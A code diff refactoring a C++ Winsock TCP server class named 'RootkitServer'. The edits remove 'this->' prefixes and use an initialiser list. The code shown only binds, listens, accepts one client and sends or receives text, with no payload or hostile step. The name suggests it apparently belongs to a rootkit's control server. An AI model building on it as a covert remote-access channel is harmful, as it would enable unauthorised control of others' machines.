@@ -19,14 +19,14 @@ bool Server::RootkitServer::init_listen_bind() {
 	sockaddr_in m_adresse;
 	m_adresse.sin_addr.s_addr = INADDR_ANY;
 	m_adresse.sin_family = AF_INET;
-	m_adresse.sin_port = htons(this->m_port);
+	m_adresse.sin_port = htons(m_port);
 
-	int status = bind(this->m_socket, (sockaddr*)&m_adresse, sizeof(m_adresse));
+	int status = bind(m_socket, (sockaddr*)&m_adresse, sizeof(m_adresse));
 
 	if (status != 0)
 		return false;
 
-	status = listen(this->m_socket, 1);
+	status = listen(m_socket, 1);
 
 	if (status != 0)
 		return false;
@@ -35,19 +35,16 @@ bool Server::RootkitServer::init_listen_bind() {
 
 }
 
-Server::RootkitServer::RootkitServer() {
-	this->m_wsa=Server::WrapWSA();
-
-	this->m_port = Server::SERVER_PORT;
-
-	this->m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+Server::RootkitServer::RootkitServer(): m_port(Server::SERVER_PORT){
+	m_wsa=Server::WrapWSA();
+	m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
 
-	if (this->m_socket == INVALID_SOCKET)
+	if (m_socket == INVALID_SOCKET)
 		throw std::exception("Couldn't open socket");
 
 
-	bool status = this->init_listen_bind();
+	bool status = init_listen_bind();
 
 
 	if (!status)
@@ -60,19 +57,19 @@ Server::RootkitServer::~RootkitServer() {
 
 	std::cout << "closing socket.\n";
 
-	closesocket(this->m_socket);
-	closesocket(this->m_client_socket);
-	this->m_wsa.cleanup();
+	closesocket(m_socket);
+	closesocket(m_client_socket);
+	m_wsa.cleanup();
 }
 
 bool Server::RootkitServer::Accept() {
 
-	this->m_client_socket = INVALID_SOCKET;
+	m_client_socket = INVALID_SOCKET;
 
 	// Accept a client socket
-	this->m_client_socket = accept(this->m_socket, NULL, NULL);
+	m_client_socket = accept(m_socket, NULL, NULL);
 
-	if (this->m_client_socket == INVALID_SOCKET)
+	if (m_client_socket == INVALID_SOCKET)
 		return false;
 
 	return true;
@@ -86,7 +83,7 @@ bool Server::RootkitServer::ReceiveText(std::string& text) {
 
 	if (bytes_recived == SOCKET_ERROR) {
 		std::cout << "SOCKET ERROR! errorcode:";
-		std::cout << this->m_wsa.getError() << "\n";
+		std::cout << m_wsa.getError() << "\n";
 		return false;
 	}
 
@@ -102,7 +99,7 @@ bool Server::RootkitServer::SendText(std::string& text) {
 
 	if (bytes_recived == SOCKET_ERROR) {
 		std::cout << "SOCKET ERROR! errorcode:";
-		std::cout << this->m_wsa.getError() << "\n";
+		std::cout << m_wsa.getError() << "\n";
 		return false;
 	}
 
